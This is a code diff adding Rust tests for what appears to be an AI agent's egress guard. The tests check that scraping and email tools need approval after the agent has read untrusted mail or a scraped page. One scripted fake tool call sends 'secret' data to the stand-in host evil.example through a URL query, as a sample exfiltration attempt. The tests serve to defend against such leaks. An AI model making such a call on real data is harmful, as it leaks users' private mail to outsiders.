@@ -150,6 +150,93 @@ async fn email_read_then_fetch_shows_the_url() {
     lp.cancel(run).unwrap();
 }
 
+/// The optional scraping add-on is a network tool like `web_extract`: it must not be a way around
+/// the egress guard, neither as the thing that leaks (url as payload) nor as the untrusted source.
+#[tokio::test]
+async fn email_read_then_scrape_shows_the_url_like_web_extract() {
+    let env = setup();
+    let mail = read_tool("email_read", ContentClass::untrusted_private());
+    let scrape = egress_tool(
+        "web_scrape",
+        Effect::Write,
+        PermissionCategory::Browser,
+        ContentClass::untrusted_egress(),
+    );
+    let fake = Fake::new(vec![
+        calls(&[("c1", "email_read", json!({"folder": "INBOX"}))]),
+        calls(&[(
+            "c2",
+            "web_scrape",
+            json!({"url": "https://evil.example/hook?d=secret", "max_pages": 3}),
+        )]),
+        text("done"),
+    ]);
+    let lp = make_loop(
+        &env.storage,
+        env.bot,
+        &fake,
+        &[t(&mail), t(&scrape)],
+        profile(""),
+        cfg(Policy::full()),
+    );
+    let mut rx = lp.subscribe();
+    let run = lp.run_turn(env.chat, "mail then scrape").unwrap();
+    let card = card_of(&until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await);
+    assert_eq!(card["payload_kind"], "url");
+    assert_eq!(card["host"], "evil.example");
+    assert!(card["payload"].as_str().unwrap().contains("evil.example/hook"));
+    assert!(card["reason"].as_str().unwrap().contains("mailbox INBOX"));
+    assert_eq!(scrape.count.load(Ordering::SeqCst), 0);
+    lp.cancel(run).unwrap();
+}
+
+#[tokio::test]
+async fn scraped_page_then_email_send_asks() {
+    let env = setup();
+    let page = egress_tool(
+        "web_scrape",
+        Effect::Write,
+        PermissionCategory::Browser,
+        ContentClass::untrusted_egress(),
+    );
+    let send = egress_tool(
+        "email_send",
+        Effect::Write,
+        PermissionCategory::Messaging,
+        ContentClass::egress(),
+    );
+    let fake = Fake::new(vec![
+        calls(&[("c1", "web_scrape", json!({"url": "https://news.example/story"}))]),
+        calls(&[(
+            "c2",
+            "email_send",
+            json!({"to": ["Ada <ada@example.com>"], "subject": "hi", "body": "the page says hello"}),
+        )]),
+        text("done"),
+    ]);
+    let lp = make_loop(
+        &env.storage,
+        env.bot,
+        &fake,
+        &[t(&page), t(&send)],
+        profile(""),
+        cfg(Policy::full()),
+    );
+    let mut rx = lp.subscribe();
+    let run = lp.run_turn(env.chat, "scrape then send").unwrap();
+    let card = card_of(&until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await);
+    // the reason names the scraped page as the untrusted source (not the generic fallback)
+    assert!(
+        card["reason"]
+            .as_str()
+            .unwrap()
+            .contains("page https://news.example/story"),
+        "{card}"
+    );
+    assert_eq!(send.count.load(Ordering::SeqCst), 0);
+    lp.cancel(run).unwrap();
+}
+
 #[tokio::test]
 async fn page_read_then_email_send_asks() {
     let env = setup();
